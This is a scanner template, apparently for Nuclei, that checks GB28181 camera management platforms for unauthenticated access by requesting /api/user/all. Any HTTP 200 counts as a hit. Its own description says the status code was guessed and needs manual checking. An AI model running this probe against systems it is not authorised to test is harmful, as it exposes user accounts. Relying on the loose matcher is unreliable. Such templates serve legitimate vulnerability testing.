id: poc-xsscttsbhrxhaua7
info:
  name: GB28181摄像头管理平台未授权访问漏洞
  author: hacktwo
  severity: medium
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: unauth,2024
http:
- raw:
  - 'GET /api/user/all HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

    Content-Length: 0'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
